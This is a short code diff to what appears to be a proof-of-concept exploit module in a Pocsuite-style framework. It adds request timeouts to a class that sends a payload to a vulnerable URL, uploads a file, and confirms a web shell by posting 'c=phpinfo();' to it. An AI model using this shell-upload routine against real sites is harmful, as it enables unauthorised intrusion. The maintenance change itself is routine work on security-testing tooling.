@@ -38,7 +38,7 @@ class DemoPOC(POCBase):
             headers = {
                 "Content-Type": "application/x-www-form-urlencoded"
             }
-            r = requests.post(vul_url, data=data, headers=headers)
+            r = requests.post(vul_url, data=data, headers=headers, timeout=15)
 
             if flag in r.text:
                 return payload, data
@@ -69,8 +69,8 @@ class DemoPOC(POCBase):
             filename=filename,
             url=shell_addr
         )
-        requests.post(vul_url, data=data, headers=headers)
-        r = requests.post(self.url + "/" + filename, data="c=phpinfo();", headers=headers)
+        requests.post(vul_url, data=data, headers=headers, timeout=15)
+        r = requests.post(self.url + "/" + filename, data="c=phpinfo();", headers=headers, timeout=15)
         if r.status_code == 200 and "PHP Extension Build" in r.text:
             result['ShellInfo'] = {}
             result['ShellInfo']['URL'] = self.url + "/" + filename
@@ -93,7 +93,7 @@ class DemoPOC(POCBase):
             headers = {
                 "Content-Type": "application/x-www-form-urlencoded"
             }
-            requests.post(vulurl, data=data, headers=headers)
+            requests.post(vulurl, data=data, headers=headers, timeout=15)
 
     def parse_output(self, result):
         output = Output(self)
